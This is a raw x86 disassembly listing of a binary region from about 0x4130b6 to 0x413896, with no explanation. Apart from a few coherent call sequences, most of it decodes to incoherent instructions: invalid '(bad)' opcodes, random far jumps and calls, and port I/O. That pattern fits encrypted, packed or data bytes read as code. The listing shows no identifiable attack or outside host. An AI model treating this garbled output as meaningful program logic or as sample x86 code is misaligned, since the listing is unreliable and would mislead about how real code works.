  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [edi+edi*4-0x4e],edi
  4130e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130e1:	mov    esp,0x181848d3
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    cl,ch
  4130eb:	jne    0x41312d
  4130ed:	loope  0x41314f
  4130ef:	jns    0x41308d
  4130f1:	in     eax,dx
  4130f2:	jecxz  0x41315e
  4130f4:	dec    esi
  4130f5:	or     DWORD PTR [eax+0x62],edi
  4130f8:	mov    al,0xe
  4130fa:	xor    al,0x36
  4130fc:	and    al,0xb1
  4130fe:	jecxz  0x4130e4
  413100:	sbb    al,bl
  413102:	add    BYTE PTR [eax+edx*8],bl
  413105:	pop    es
  413106:	and    edi,0xc27b3afe
  41310c:	(bad)  
  41310d:	dec    esp
  41310e:	mov    eax,0xec2bcadd
  413113:	enter  0x7755,0x9d
  413117:	cmc    
  413118:	test   DWORD PTR [ebp+0x52],0xa0dec74b
  41311f:	fwait
  413120:	shl    DWORD PTR [edx+0x36],1
  413123:	mov    eax,0xcab8dcfd
  413128:	mov    bh,0x6
  41312a:	in     eax,0x61
  41312c:	jl     0x413118
  41312e:	cli    
  41312f:	jne    0x4130dd
  413131:	clc    
  413132:	and    ebp,DWORD PTR [edx+0xc]
  413135:	mov    ebx,0xd87fb4f9
  41313a:	(bad)  
  41313b:	mov    eax,ds:0xdf11f9fe
  413140:	cmovbe ebx,DWORD PTR [edi]
  413143:	div    DWORD PTR ds:0xa2b437bb
  413149:	js     0x413168
  41314b:	push   cs
  41314c:	sub    eax,0x55b5ab69
  413151:	dec    ecx
  413152:	inc    ecx
  413153:	jp     0x4131a4
  413155:	cwde   
  413156:	xchg   DWORD PTR [edx+0x2e],edx
  413159:	aas    
  41315a:	push   0x35
  41315c:	pop    edi
  41315d:	jne    0x413146
  41315f:	fdivr  QWORD PTR [esi+0xed55ab2]
  413165:	mov    bl,BYTE PTR [edx-0x2a93b75b]
  41316b:	push   edx
  41316c:	dec    esi
  41316d:	ss mov cl,0xd1
  413170:	jle    0x413176
  413172:	int    0xbc
  413174:	(bad)  
  413176:	mov    esp,0xc6f9fb48
  41317b:	xlat   BYTE PTR ds:[ebx]
  41317c:	sub    BYTE PTR [edi-0xe904056],ch
  413182:	in     eax,0x6d
  413184:	add    al,BYTE PTR [edi]
  413186:	cmp    ebx,DWORD PTR [ebx-0x22ad8dd]
  41318c:	nop
  41318d:	mov    cl,0x68
  41318f:	jno    0x41311f
  413191:	sub    ch,BYTE PTR [eax-0x44]
  413194:	lea    ecx,[ebx]
  413196:	inc    eax
  413197:	call   FWORD PTR [eax+0x11]
  41319a:	sti    
  41319b:	pop    es
  41319c:	mov    edi,0xcfb03aee
  4131a1:	sar    BYTE PTR [eax],1
  4131a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131a4:	push   edi
  4131a5:	scas   al,BYTE PTR es:[edi]
  4131a6:	jmp    0x4131bb
  4131a8:	jge    0x4131b8
  4131aa:	ret    0xa0ff
  4131ad:	test   al,0xc4
  4131af:	imul   ecx,ebx,0x3f229f6f
  4131b5:	xchg   ebp,eax
  4131b6:	popf   
  4131b7:	pop    esi
  4131b8:	xor    eax,0xb6d426c6
  4131bd:	cwde   
  4131be:	xchg   ecx,eax
  4131bf:	ja     0x4131f8
  4131c1:	gs in  al,0x19
  4131c4:	hlt    
  4131c5:	not    DWORD PTR [eax+0x38]
  4131c8:	ja     0x413233
  4131ca:	dec    esi
  4131cb:	and    DWORD PTR [esi+edx*4-0x7f0bfa07],edi
  4131d2:	outs   dx,BYTE PTR ds:[esi]
  4131d3:	and    al,cl
  4131d5:	test   eax,0x84e07ef3
  4131da:	xor    al,0x50
  4131dc:	or     eax,0xb25ed356
  4131e1:	mov    bh,0x2a
  4131e3:	outs   dx,DWORD PTR ds:[esi]
  4131e4:	dec    esi
  4131e5:	cmc    
  4131e6:	jmp    0xe540:0xe46413c6
  4131ed:	jg     0x413249
  4131ef:	xchg   ecx,eax
  4131f0:	(bad)  
  4131f1:	lea    ebp,[edi]
  4131f3:	stc    
  4131f4:	pop    edx
  4131f5:	rol    WORD PTR [esi],1
  4131f8:	inc    ebx
  4131f9:	mov    eax,0xfde41e66
  4131fe:	sbb    ecx,ebx
  413200:	out    0x7e,eax
  413202:	fcom   QWORD PTR ds:0xc71a6e0b
  413208:	mov    cl,0xa5
  41320a:	leave  
  41320b:	or     eax,0xee9244f3
  413210:	clc    
  413211:	loop   0x413234
  413213:	ins    DWORD PTR es:[edi],dx
  413214:	or     DWORD PTR [esi+0x50e6be4c],edi
  41321a:	mov    dl,0x8e
  41321c:	sbb    eax,0x7cea4671
  413221:	ud1    ecx,DWORD PTR [eax+0x75]
  413225:	das    
  413226:	daa    
  413227:	in     al,dx
  413228:	iret   
  413229:	ret    
  41322a:	or     DWORD PTR [ecx+0x78],ebx
  41322d:	sbb    al,0x30
  41322f:	sahf   
  413230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413231:	js     0x413279
  413233:	xchg   ecx,eax
  413234:	cdq    
  413235:	sar    DWORD PTR [ecx],cl
  413237:	lods   al,BYTE PTR ds:[esi]
  413238:	mov    edi,0xc291ce1f
  41323d:	adc    dh,BYTE PTR ds:0x4cc681e6
  413243:	cmp    ecx,DWORD PTR ds:0x121b8a83
  413249:	loop   0x413212
  41324b:	cmp    ebx,DWORD PTR [ecx]
  41324d:	sbb    al,0x1f
  41324f:	je     0x4131f8
  413251:	inc    ecx
  413252:	test   eax,0xa92061ef
  413257:	mov    ebx,0x1876c4bc
  41325c:	jg     0x413220
  41325e:	sub    al,0x56
  413260:	pop    edx
  413261:	fcomp  QWORD PTR [ecx+ebp*4]
  413264:	rcl    BYTE PTR [edi],cl
  413266:	in     eax,0x2e
  413268:	inc    esi
  413269:	push   eax
  41326a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41326c:	leave  
  41326d:	addr16 inc edi
  41326f:	loop   0x413255
  413271:	sbb    al,0xed
  413273:	cmc    
  413274:	enter  0x985e,0xd8
  413278:	push   ebx
  413279:	pop    DWORD PTR [eax+0x27]
  41327c:	inc    ecx
  41327d:	add    ch,BYTE PTR [ecx-0x64]
  413280:	popa   
  413281:	add    al,ah
  413283:	mov    ds:0xfdb71dfd,al
  413288:	loope  0x41328c
  41328a:	lock fs fabs 
  41328e:	mov    dh,BYTE PTR [eax]
  413290:	lods   eax,DWORD PTR ds:[esi]
  413291:	(bad)  
  413292:	pop    esp
  413293:	mov    eax,0x34e8f545
  413298:	test   al,0x96
  41329a:	mov    BYTE PTR [ecx],dl
  41329c:	dec    edi
  41329d:	push   cs
  41329e:	jo     0x413222
  4132a0:	xchg   esp,eax
  4132a1:	cmc    
  4132a2:	sub    eax,0xb85cf071
  4132a7:	jae    0x4132af
  4132a9:	push   cs
  4132aa:	test   eax,0x6fd3535a
  4132af:	xor    bh,BYTE PTR [edi-0x11]
  4132b2:	push   ebp
  4132b3:	pop    edi
  4132b4:	popa   
  4132b5:	stc    
  4132b6:	xor    ebx,esi
  4132b8:	retf   
  4132b9:	sbb    eax,0xe8bf06aa
  4132be:	(bad)  
  4132bf:	retf   0x9891
  4132c2:	bndldx bnd2,[ebx+0x636fa59]
  4132c9:	mov    eax,ds:0x440ffb5e
  4132ce:	adc    eax,0x263e1248
  4132d3:	add    eax,DWORD PTR [edi-0x4f9cc748]
  4132d9:	cmp    esi,DWORD PTR [esi+esi*8+0x6ac31054]
  4132e0:	mov    BYTE PTR [ebx+edx*1],bl
  4132e3:	push   0xffffffc6
  4132e5:	jecxz  0x413328
  4132e7:	xchg   edx,eax
  4132e8:	sahf   
  4132e9:	pop    es
  4132ea:	or     al,0x35
  4132ec:	bound  esi,QWORD PTR ds:0xc386571c
  4132f2:	not    BYTE PTR [eax-0x23]
  4132f5:	daa    
  4132f6:	inc    bp
  4132f8:	iret   
  4132f9:	add    al,0x62
  4132fb:	jmp    0x94a:0x77a53a0f
  413302:	dec    esi
  413303:	push   0x63
  413305:	and    eax,0x65934de1
  41330a:	push   ebp
  41330b:	in     eax,dx
  41330c:	test   DWORD PTR [ebp+0x7878262c],eax
  413312:	pop    ebx
  413313:	fcmovnbe st,st(1)
  413315:	lahf   
  413316:	dec    esi
  413317:	xor    eax,0x84a16fb4
  41331c:	call   0x9b65:0x611b5b87
  413323:	mov    ds:0xd5737b4d,eax
  413328:	and    al,0xea
  41332a:	shr    BYTE PTR [eax-0x27b9149a],1
  413330:	jge    0x4132d8
  413332:	or     BYTE PTR [edi],ch
  413334:	es dec ecx
  413336:	and    edi,esp
  413338:	or     al,BYTE PTR [ebx+ebp*2-0x2a]
  41333c:	shl    al,1
  41333e:	xor    bl,al
  413340:	jg     0x4132c9
  413342:	add    ch,BYTE PTR [esi-0x334c65c6]
  413348:	jb     0x413335
  41334a:	or     DWORD PTR cs:[ecx+0x4e4b3f2f],edx
  413351:	jns    0x41330f
  413353:	pop    ss
  413354:	dec    eax
  413355:	push   0x58e4c37
  41335a:	aam    0x8f
  41335c:	or     bl,BYTE PTR [edx-0x186fd03f]
  413362:	dec    edx
  413363:	cli    
  413364:	and    esi,DWORD PTR cs:[edx]
  413367:	inc    ebx
  413368:	jbe    0x413306
  41336a:	mov    al,0x97
  41336c:	stc    
  41336d:	jp     0x41336a
  41336f:	inc    ebp
  413370:	iret   
  413371:	addr16 mov ds:0x10cc,al
  413375:	xchg   edx,eax
  413376:	mov    DWORD PTR [ebp-0x20],ecx
  413379:	jecxz  0x4133ed
  41337b:	dec    esp
  41337c:	inc    ebp
  41337d:	sub    cl,BYTE PTR [ebp-0x246600fe]
  413383:	das    
  413384:	adc    al,0x7c
  413386:	mov    dh,0x3f
  413388:	and    esi,DWORD PTR [eax]
  41338a:	in     al,dx
  41338b:	shl    edi,1
  41338d:	mov    dh,0xfa
  41338f:	nop
  413390:	dec    ebp
  413391:	mov    bh,0x2c
  413393:	nop
  413394:	or     eax,0xe7f122d7
  413399:	mov    WORD PTR [ecx*4-0x4f2e9c83],ss
  4133a0:	clc    
  4133a1:	enter  0xf93c,0x18
  4133a5:	(bad)  
  4133a6:	or     dh,BYTE PTR [ebx]
  4133a8:	cmp    dh,BYTE PTR [ecx-0x6]
  4133ab:	inc    edx
  4133ac:	stos   BYTE PTR es:[edi],al
  4133ad:	inc    edx
  4133ae:	jae    0x413336
  4133b0:	inc    esi
  4133b1:	lods   eax,DWORD PTR ds:[esi]
  4133b2:	push   es
  4133b3:	pop    es
  4133b4:	lock xor dl,bh
  4133b7:	sub    eax,0x8de1a90
  4133bc:	mov    esp,0xc0c1fde6
  4133c1:	ss aaa 
  4133c3:	or     eax,0xabb6dcf4
  4133c8:	push   edx
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	ror    BYTE PTR [ecx-0x76c2f8c4],cl
  4133d0:	add    eax,0xf8e69e54
  4133d5:	test   eax,0xa32308d0
  4133da:	jo     0x413364
  4133dc:	fistp  QWORD PTR [eax]
  4133de:	dec    eax
  4133df:	and    al,0xe5
  4133e1:	or     al,0x6d
  4133e3:	(bad)  
  4133e5:	xchg   esp,eax
  4133e6:	call   0xea2c:0xe36a3ad5
  4133ed:	mov    esp,cs
  4133ef:	push   ss
  4133f0:	popf   
  4133f1:	jno    0x41343d
  4133f3:	daa    
  4133f4:	es dec eax
  4133f6:	sbb    DWORD PTR [ecx],ebp
  4133f8:	adc    DWORD PTR es:[ecx+0x3d8c50e1],eax
  4133ff:	into   
  413400:	popa   
  413401:	pop    edi
  413402:	ins    DWORD PTR es:[edi],dx
  413403:	nop
  413404:	adc    ebp,0xffffff92
  413407:	aad    0x11
  413409:	mov    ebx,0xec2751ac
  41340e:	push   es
  41340f:	outs   dx,DWORD PTR ds:[esi]
  413410:	mov    bl,BYTE PTR [eax]
  413412:	ret    
  413413:	hlt    
  413414:	mov    bh,0xec
  413416:	mov    ah,0x42
  413418:	out    0x9e,al
  41341a:	stos   DWORD PTR es:[edi],eax
  41341b:	arpl   WORD PTR [edx+0x7dfc07c6],cx
  413421:	mov    dl,0x9d
  413423:	and    BYTE PTR [edi-0x1d],0xdc
  413427:	sbb    ch,BYTE PTR [edi-0x4da2952a]
  41342d:	pop    es
  41342e:	test   DWORD PTR [esi+0x4b],eax
  413431:	jecxz  0x413406
  413433:	inc    ebx
  413434:	call   0x83fc:0x4b314be0
  41343b:	xor    BYTE PTR [edx+0x3d],0xbb
  41343f:	fistp  QWORD PTR ds:0xe92aa52c
  413445:	cmc    
  413446:	std    
  413447:	out    dx,eax
  413448:	stc    
  413449:	push   esp
  41344a:	xchg   BYTE PTR [ecx-0x1b851eba],ah
  413450:	mov    DWORD PTR [ecx+0x45],ebp
  413453:	pop    eax
  413454:	fldenv [edi-0x3ff2b4c9]
  41345a:	or     BYTE PTR ds:0xa590,bh
  41345f:	sbb    DWORD PTR [edi-0x16],eax
  413462:	jle    0x4134db
  413464:	ret    0xfa6b
  413467:	fdiv   DWORD PTR [eax+0x738c0ed1]
  41346d:	sbb    esp,0x1c856eff
  413473:	and    eax,0xb95218e8
  413478:	adc    ebx,ecx
  41347a:	sub    ch,BYTE PTR [edx]
  41347c:	mov    ch,0x41
  41347e:	fwait
  41347f:	adc    BYTE PTR [ebx-0x1a73b4c0],0x3c
  413486:	icebp  
  413487:	xchg   edi,eax
  413488:	test   DWORD PTR [esi+0x6ab8f07e],edi
  41348e:	sub    al,0x1
  413490:	mov    dl,0xd1
  413492:	stos   BYTE PTR es:[edi],al
  413493:	mov    WORD PTR [edx-0x9],ds
  413496:	or     esi,ecx
  413498:	sar    BYTE PTR [esi],1
  41349a:	leave  
  41349b:	xor    eax,0xbf4428da
  4134a0:	push   eax
  4134a1:	push   edi
  4134a2:	push   es
  4134a3:	sbb    eax,0x73d28177
  4134a8:	xchg   ebp,eax
  4134a9:	add    BYTE PTR [eax],al
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x42202e
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x1d70709f]
  4134d4:	sub    DWORD PTR [edx+0x18184264],ebp
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [eax],ah
  4134df:	dec    edi
  4134e0:	dec    edx
  4134e1:	daa    
  4134e2:	or     BYTE PTR [esi+0x2871129c],ah
  4134e8:	and    esi,DWORD PTR [ecx-0x63]
  4134eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ec:	inc    eax
  4134ed:	or     eax,0xa1d58d6b
  4134f2:	and    dh,dl
  4134f4:	dec    edi
  4134f5:	neg    dl
  4134f7:	repz inc esp
  4134f9:	rcr    DWORD PTR [edi],cl
  4134fb:	loope  0x413561
  4134fd:	pmulhw mm3,QWORD PTR [ebp-0x6e5102fc]
  413504:	pop    edi
  413505:	shl    BYTE PTR [edi*8+0x6a4b6313],1
  41350c:	je     0x41351c
  41350e:	sbb    al,0x54
  413510:	push   0xb0efa083
  413515:	in     eax,dx
  413516:	cld    
  413517:	mov    dh,0x1b
  413519:	pop    ecx
  41351a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41351b:	stc    
  41351c:	inc    esp
  41351d:	inc    edx
  41351e:	es hlt 
  413520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413521:	leave  
  413522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413523:	or     dh,cl
  413525:	inc    ecx
  413526:	outs   dx,BYTE PTR ds:[esi]
  413527:	out    dx,eax
  413528:	adc    esp,edi
  41352a:	mov    eax,0x410bc6b9
  41352f:	imul   esi,DWORD PTR [eax-0x4d],0xffffffd2
  413533:	inc    esi
  413534:	sub    eax,0xb8ec50f9
  413539:	ss and eax,0x3f722fc3
  41353f:	fwait
  413540:	es mov bl,0x62
  413543:	jns    0x413549
  413545:	retf   
  413546:	xchg   esi,eax
  413547:	pusha  
  413548:	sbb    edi,DWORD PTR [edi]
  41354a:	mov    ecx,0x5e193969
  41354f:	mov    ds:0xbee477a2,al
  413554:	jmp    0xa6954081
  413559:	ret    0x2ffa
  41355c:	dec    edi
  41355d:	mov    dl,0x91
  41355f:	push   esi
  413560:	mov    cl,0xc
  413562:	xor    BYTE PTR [ebx],ah
  413564:	mov    es,ecx
  413566:	inc    ecx
  413567:	mov    bh,0xb4
  413569:	xchg   edx,eax
  41356a:	sbb    al,ch
  41356c:	mov    ebx,0xe5909532
  413571:	dec    edx
  413572:	aad    0xad
  413574:	or     eax,0x94974a
  413579:	xor    ebx,DWORD PTR [edi+0x309168c4]
  41357f:	dec    ecx
  413580:	nop
  413581:	mov    dh,ah
  413583:	xor    ebp,edx
  413585:	mov    esp,0x12b262e3
  41358a:	scas   al,BYTE PTR es:[edi]
  41358b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41358c:	adc    al,0x5
  41358e:	fsubr  DWORD PTR [esi]
  413590:	std    
  413591:	cmp    bh,BYTE PTR [esi-0x4a]
  413594:	ds mov esi,0x36c929e0
  41359a:	outs   dx,DWORD PTR ds:[esi]
  41359b:	jnp    0x41360c
  41359d:	es sbb al,0xf4
  4135a0:	out    dx,eax
  4135a1:	sti    
  4135a2:	dec    ebp
  4135a3:	fdiv   QWORD PTR [ebp-0x11]
  4135a6:	dec    esp
  4135a7:	pop    esp
  4135a8:	xchg   esi,eax
  4135a9:	pusha  
  4135aa:	mov    ds:0xb2f24da8,al
  4135af:	mov    ?,WORD PTR [edi-0x1051c565]
  4135b5:	jne    0x4135ba
  4135b7:	jmp    0x1b25:0x6bdaeb08
  4135be:	mov    ds,WORD PTR [eax+eiz*4]
  4135c1:	addr16 mov cl,0x4b
  4135c4:	inc    edx
  4135c5:	ror    BYTE PTR [ebp-0x35af2fae],0xd
  4135cc:	mov    dh,al
  4135ce:	xor    BYTE PTR [edi-0x55],0x7
  4135d2:	sahf   
  4135d3:	jne    0x4135a0
  4135d5:	fisttp DWORD PTR [ebx+0x2d]
  4135d8:	popa   
  4135d9:	mov    ch,0x4a
  4135db:	xchg   esi,eax
  4135dc:	pop    edx
  4135dd:	push   es
  4135de:	push   ebx
  4135df:	stos   BYTE PTR es:[edi],al
  4135e0:	(bad)  
  4135e1:	push   ss
  4135e2:	sbb    al,0xa1
  4135e4:	xchg   cl,ah
  4135e6:	xor    edi,DWORD PTR [ebp-0x5f01d6b4]
  4135ec:	jmp    0x833c:0x21810f76
  4135f3:	retf   
  4135f4:	test   DWORD PTR [ecx-0x765823a4],edi
  4135fa:	dec    edx
  4135fb:	xchg   BYTE PTR [edi+esi*2+0x5e8d7cc7],ch
  413602:	push   ebx
  413603:	jl     0x413629
  413605:	inc    eax
  413606:	add    dl,BYTE PTR [eax-0x3db05fa1]
  41360c:	into   
  41360d:	mov    ds:0xf4a7f036,al
  413612:	push   ebp
  413613:	scas   eax,DWORD PTR es:[edi]
  413614:	sbb    bl,BYTE PTR [edi+0x76]
  413617:	out    dx,al
  413618:	aas    
  413619:	gs int 0x64
  41361c:	daa    
  41361d:	stos   DWORD PTR es:[edi],eax
  41361e:	cmc    
  41361f:	in     eax,0xdd
  413621:	outs   dx,DWORD PTR ds:[esi]
  413622:	pusha  
  413623:	jp     0x41364e
  413625:	or     DWORD PTR [edi+0x16695d10],ebp
  41362b:	mov    cl,0x63
  41362d:	dec    esi
  41362e:	pop    edx
  41362f:	cwde   
  413630:	nop
  413631:	popf   
  413632:	gs and edx,ebp
  413635:	inc    ebp
  413636:	lock dec ecx
  413638:	pop    eax
  413639:	xchg   esp,eax
  41363a:	outs   dx,DWORD PTR ds:[esi]
  41363b:	cwde   
  41363c:	ins    DWORD PTR es:[edi],dx
  41363d:	dec    edx
  41363e:	or     dl,BYTE PTR [esi+0x60]
  413641:	and    BYTE PTR [edx],0x11
  413644:	sub    bh,BYTE PTR [edi+0x3c983cf3]
  41364a:	les    edx,FWORD PTR [esi+edi*2-0x44]
  41364e:	sub    bh,BYTE PTR [edi]
  413650:	jle    0x4136b3
  413652:	dec    edx
  413653:	rcl    DWORD PTR [ebx+eax*1],1
  413656:	push   cs
  413657:	lods   eax,DWORD PTR ds:[esi]
  413658:	adc    ch,BYTE PTR [edi]
  41365a:	je     0x4135f2
  41365c:	out    dx,eax
  41365d:	paddq  mm5,mm2
  413660:	push   ecx
  413661:	jle    0x41363e
  413663:	fs iret 
  413665:	lea    eax,[eax+0x7894cf52]
  41366b:	or     dh,BYTE PTR [edx]
  41366d:	cmp    DWORD PTR [ebx-0x64],ebp
  413670:	jno    0x413616
  413672:	std    
  413673:	inc    esi
  413674:	inc    ebp
  413675:	xlat   BYTE PTR ds:[ebx]
  413676:	sbb    dl,BYTE PTR [esi-0x40]
  413679:	xor    eax,0x6b5089c5
  41367e:	cmp    dh,BYTE PTR [eax-0x24e6b579]
  413684:	mov    bh,0x21
  413686:	arpl   WORD PTR [edx+0x27],cx
  413689:	mov    dl,BYTE PTR [ecx]
  41368b:	lods   eax,DWORD PTR ds:[esi]
  41368c:	or     eax,0x9810c1b4
  413691:	pop    edi
  413692:	push   eax
  413693:	fadd   QWORD PTR [eax+0xd]
  413696:	mov    esp,ebx
  413698:	repz dec edi
  41369a:	pop    ebp
  41369b:	(bad)  
  41369c:	dec    esi
  41369d:	scas   eax,DWORD PTR es:[edi]
  41369e:	sbb    al,0xcd
  4136a0:	(bad)  
  4136a1:	mov    al,0xc0
  4136a3:	ds ins DWORD PTR es:[edi],dx
  4136a5:	push   ebx
  4136a6:	not    BYTE PTR [eax-0x16]
  4136a9:	ror    BYTE PTR [esi],1
  4136ab:	cdq    
  4136ac:	out    dx,al
  4136ad:	sbb    cl,0x3b
  4136b0:	out    dx,al
  4136b1:	mov    ds:0xf1656064,al
  4136b6:	hlt    
  4136b7:	cwde   
  4136b8:	(bad)  
  4136b9:	cs jb  0x413667
  4136bc:	fs into 
  4136be:	dec    ebx
  4136bf:	jl     0x4136d3
  4136c1:	push   edx
  4136c2:	xor    esp,DWORD PTR [ecx+edi*8-0x284531c1]
  4136c9:	jmp    0x40e108f1
  4136ce:	push   ebx
  4136cf:	dec    eax
  4136d0:	push   ebp
  4136d1:	data16 xor bl,BYTE PTR [esi]
  4136d4:	(bad)  
  4136d5:	int    0xf0
  4136d7:	push   ebx
  4136d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136d9:	or     ah,BYTE PTR [edx+0x7ad128b4]
  4136df:	sbb    al,0x29
  4136e1:	int3   
  4136e2:	sub    ch,BYTE PTR [eax-0x37]
  4136e5:	es ins BYTE PTR es:[edi],dx
  4136e7:	add    bh,BYTE PTR [edi]
  4136e9:	nop
  4136ea:	leave  
  4136eb:	je     0x4136fb
  4136ed:	jb     0x413722
  4136ef:	test   BYTE PTR [ecx-0x47a2fa55],ch
  4136f5:	jmp    0x3673:0xdfb606f8
  4136fc:	je     0x4136c2
  4136fe:	xor    eax,0x5b46da8e
  413703:	mov    gs:0x80aa0e57,al
  413709:	xchg   BYTE PTR [ecx-0x5e],ch
  41370c:	xchg   esi,eax
  41370d:	dec    ecx
  41370e:	sub    ah,0xbb
  413711:	popa   
  413712:	push   eax
  413713:	push   0xffffff86
  413715:	fild   WORD PTR [ebx+0x57]
  413718:	dec    edi
  413719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41371a:	pushf  
  41371b:	add    edx,DWORD PTR [esi+0x73119b47]
  413721:	fild   WORD PTR [ebx]
  413723:	call   0x30216323
  413728:	inc    ecx
  413729:	aam    0x32
  41372b:	ret    
  41372c:	in     al,dx
  41372d:	xlat   BYTE PTR ds:[ebx]
  41372e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413730:	xlat   BYTE PTR ds:[ebx]
  413731:	cmp    eax,0x7040177e
  413736:	jmp    0x3689b284
  41373b:	xchg   ebp,eax
  41373c:	sub    eax,0x384548d
  413741:	in     eax,dx
  413742:	cdq    
  413743:	jo     0x413776
  413745:	cli    
  413746:	ja     0x4137bd
  413748:	and    BYTE PTR [ecx+0x55],ah
  41374b:	addr16 loopne 0x4137aa
  41374e:	mov    ebp,0x1ee8d02b
  413753:	jne    0x41371d
  413755:	mov    al,ds:0x37483836
  41375a:	mov    eax,ds:0x7dc106fb
  41375f:	push   esp
  413760:	fbld   TBYTE PTR [eax]
  413762:	pusha  
  413763:	jmp    0x82ce:0x2da8e6e2
  41376a:	or     bl,BYTE PTR [eax]
  41376c:	popa   
  41376d:	add    eax,0x59bd7ae8
  413772:	jecxz  0x413749
  413774:	jle    0x413728
  413776:	dec    esp
  413777:	xor    edi,0x9d3313ec
  41377d:	pop    esp
  41377e:	push   ecx
  41377f:	inc    ecx
  413780:	cmp    al,bl
  413782:	clc    
  413783:	cld    
  413784:	sub    dl,BYTE PTR ds:0x66eb5d2d
  41378a:	cs jg  0x4137da
  41378d:	xchg   edx,eax
  41378e:	imul   eax,esp,0xffffffb1
  413791:	retf   0xbd9b
  413794:	push   0xffffff8c
  413796:	mov    edi,0xa03ea040
  41379b:	mov    BYTE PTR [ebx+0x63],dh
  41379e:	xor    al,0x2a
  4137a0:	inc    eax
  4137a1:	push   0xc22526ea
  4137a6:	mov    DWORD PTR [ecx-0x51ac8376],edi
  4137ac:	icebp  
  4137ad:	xchg   ecx,eax
  4137ae:	xlat   BYTE PTR ds:[ebx]
  4137af:	jge    0x41381c
  4137b1:	push   esp
  4137b2:	push   ss
  4137b3:	nop
  4137b4:	mov    dl,0x82
  4137b6:	xchg   esp,eax
  4137b7:	inc    esi
  4137b8:	ret    0xb2bc
  4137bb:	mov    ch,0x94
  4137bd:	or     eax,0x21d1cc9
  4137c2:	inc    ebx
  4137c3:	or     al,0x77
  4137c5:	mov    dl,0x7d
  4137c7:	pop    ds
  4137c8:	loopne 0x4137a0
  4137ca:	adc    al,dl
  4137cc:	std    
  4137cd:	test   eax,0x1aa5cfcf
  4137d2:	(bad)  
  4137d3:	jg     0x41381e
  4137d5:	test   DWORD PTR [esi+edx*8-0x40],0x7434f0eb
  4137dd:	enter  0x7159,0xab
  4137e1:	(bad)
  4137e4:	push   es
  4137e5:	and    ecx,DWORD PTR ds:0xf8937741
  4137eb:	or     eax,0xf991ed3f
  4137f0:	sub    ecx,eax
  4137f2:	sti    
  4137f3:	neg    BYTE PTR [esi+0x47]
  4137f6:	pushf  
  4137f7:	lods   al,BYTE PTR ds:[esi]
  4137f8:	sbb    DWORD PTR [ebp+0x30f10f67],ecx
  4137fe:	ins    DWORD PTR es:[edi],dx
  4137ff:	stos   DWORD PTR es:[edi],eax
  413800:	dec    esp
  413801:	pop    ss
  413802:	mov    dh,dl
  413804:	lahf   
  413805:	jae    0x413797
  413807:	pusha  
  413808:	mov    ebx,0x65fe55ef
  41380d:	sub    ecx,edx
  41380f:	pop    esi
  413810:	ret    0x2065
  413813:	loopne 0x4137c5
  413815:	push   ebp
  413816:	out    dx,eax
  413817:	xchg   ebx,eax
  413818:	aaa    
  413819:	or     dh,BYTE PTR [ebx]
  41381b:	jmp    0x413854
  41381d:	in     al,dx
  41381e:	or     al,0xb1
  413820:	cmp    ch,al
  413822:	stos   BYTE PTR es:[edi],al
  413823:	sbb    al,BYTE PTR [edx+0xdc46f3d]
  413829:	and    al,0xd6
  41382b:	fs dec ecx
  41382d:	cdq    
  41382e:	repnz in al,dx
  413830:	sahf   
  413831:	into   
  413832:	(bad)  
  413833:	jg     0x4137fa
  413835:	push   ss
  413836:	mov    al,ds:0x2b5d3479
  41383b:	lock cmp BYTE PTR [ecx-0xd5bff4b],ah
  413842:	add    ebx,ebp
  413844:	mov    fs,WORD PTR [edx]
  413846:	mov    ebp,esi
  413848:	mov    gs,WORD PTR [edi+0x35]
  41384b:	push   ecx
  41384c:	mov    DWORD PTR [eax],esi
  41384e:	ss enter 0xfa34,0x4e
  413853:	sub    DWORD PTR [ecx+0x44],esi
  413856:	push   ss
  413857:	sbb    al,BYTE PTR [edx+0x40]
  41385a:	push   0x5
  41385c:	imul   edi,DWORD PTR [edi+ecx*8-0x2b5a0b20],0xffffffa7
  413864:	inc    eax
  413865:	mov    ah,0xdb
  413867:	jae    0x41389c
  413869:	call   0xc6096c7f
  41386e:	je     0x4138c1
  413870:	xor    bl,BYTE PTR gs:[edx]
  413873:	retf   0x8751
  413876:	(bad)  
  413878:	xor    ecx,DWORD PTR [ecx]
  41387a:	js     0x4138b3
  41387c:	mov    eax,ds:0xbb73d526
  413881:	adc    bl,BYTE PTR [edx-0x53]
  413884:	add    bl,BYTE PTR [ebx]
  413886:	scas   al,BYTE PTR es:[di]
  413888:	sti    
  413889:	push   ss
  41388a:	mov    ebx,0xf7b1cf65
  41388f:	cmp    eax,0x78afc3a9
  413894:	adc    al,dh
  413896:	sbb    al,0x75
